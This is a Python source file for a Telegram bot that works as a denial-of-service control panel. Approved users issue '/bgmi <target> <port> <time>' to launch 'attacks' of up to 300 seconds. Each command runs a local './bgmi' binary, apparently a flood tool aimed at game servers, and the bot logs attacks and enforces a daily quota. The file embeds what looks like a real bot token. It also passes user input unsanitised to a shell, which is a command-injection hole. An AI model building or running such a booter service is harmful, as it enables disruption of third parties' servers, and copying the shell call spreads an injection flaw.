#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import threading
from collections import defaultdict

# Insert your Telegram bot token here
bot = telebot.TeleBot('6387049462:AAFreKcPrZpOggSrfi54Pqu0X3qE7nm7EuI')

# Admin user IDs
admin_id = ["1383324178", "6060545769", "1871909759"]

# File to store allowed user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Track user attack count
user_attack_count = defaultdict(int)
user_attack_timestamps = defaultdict(list)
MAX_ATTACKS_PER_DAY = 20

# Track user approval times
user_approval_expiry = {}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to save users
def save_users():
    with open(USER_FILE, "w") as file:
        for user in allowed_user_ids:
            file.write(f"{user}\n")

# Function to log attacks
def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as file:
        file.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Time: {time}\n")

# Function to notify admins when an attack starts
def notify_admins(user_id, target, port, time):
    remaining_attacks = MAX_ATTACKS_PER_DAY - user_attack_count.get(user_id, 0)
    for admin in admin_id:
        bot.send_message(
            admin,
            f"🚨 **Attack Started** 🚨\n"
            f"👤 User ID: {user_id}\n"
            f"🎯 Target: {target}\n"
            f"🔢 Port: {port}\n"
            f"⏳ Duration: {time}s\n"
            f"🔄 Remaining Attacks: {remaining_attacks}"
        )

# Reset attack count daily
def reset_attack_counts():
    global user_attack_count, user_attack_timestamps
    current_time = datetime.datetime.now()
    for user in list(user_attack_timestamps.keys()):
        user_attack_timestamps[user] = [t for t in user_attack_timestamps[user] if (current_time - t).days < 1]
        user_attack_count[user] = len(user_attack_timestamps[user])

# Handler for /bgmi command (Start Attack)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    # Reset daily attack counts if needed
    reset_attack_counts()

    if user_id in allowed_user_ids:
        if user_attack_count[user_id] >= MAX_ATTACKS_PER_DAY:
            bot.reply_to(message, "❌ You have reached your daily limit of 20 attacks. Try again tomorrow!")
            return

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])

            if time > 300:
                bot.reply_to(message, "Error: Maximum allowed attack time is 300 seconds.")
                return

            log_command(user_id, target, port, time)
            user_attack_count[user_id] += 1
            user_attack_timestamps[user_id].append(datetime.datetime.now())

            notify_admins(user_id, target, port, time)

            bot.reply_to(message, f"🔥 **Attack Started!**\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {time}s")

            full_command = f"./bgmi {target} {port} {time}"
            subprocess.run(full_command, shell=True)

            bot.send_message(user_id, f"✅ **Attack Finished!**\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {time}s")
        else:
            bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "🚫 Unauthorized Access! Contact an admin for approval.")

# Approve users with expiration time
@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) != 3:
            bot.reply_to(message, "✅ Usage: /approve <user_id> <duration><h/d> (e.g., 1h, 3d)")
            return

        target_user = command[1]
        duration = command[2]

        # Extract time and unit
        time_unit = duration[-1]
        if time_unit not in ['h', 'd']:
            bot.reply_to(message, "❌ Invalid time format! Use 'h' for hours or 'd' for days.")
            return

        try:
            time_value = int(duration[:-1])
            if time_value <= 0:
                raise ValueError
        except ValueError:
            bot.reply_to(message, "❌ Invalid time duration! Use a positive number.")
            return

        expiry_time = datetime.datetime.now()
        if time_unit == 'h':
            expiry_time += datetime.timedelta(hours=time_value)
        elif time_unit == 'd':
            expiry_time += datetime.timedelta(days=time_value)

        user_approval_expiry[target_user] = expiry_time
        allowed_user_ids.append(target_user)
        save_users()

        bot.reply_to(message, f"✅ **User {target_user} approved!**\n🕒 Expires at: {expiry_time}")

        # Schedule removal
        threading.Thread(target=schedule_removal, args=(target_user, expiry_time)).start()
    else:
        bot.reply_to(message, "🚫 Only admins can use this command.")

# Schedule user removal
def schedule_removal(user_id, expiry_time):
    while datetime.datetime.now() < expiry_time:
        pass
    if user_id in allowed_user_ids:
        allowed_user_ids.remove(user_id)
        save_users()
        bot.send_message(user_id, "⚠️ Your approval has expired. Contact an admin for re-approval.")

# Command to check approval status
@bot.message_handler(commands=['check_approval'])
def check_approval(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "✅ Usage: /check_approval <user_id>")
        return

    target_user = command[1]
    expiry_time = user_approval_expiry.get(target_user, None)

    if expiry_time:
        bot.reply_to(message, f"🕒 **User {target_user} is approved until {expiry_time}.**")
    else:
        bot.reply_to(message, f"❌ **User {target_user} is not approved.**")

# Start bot polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
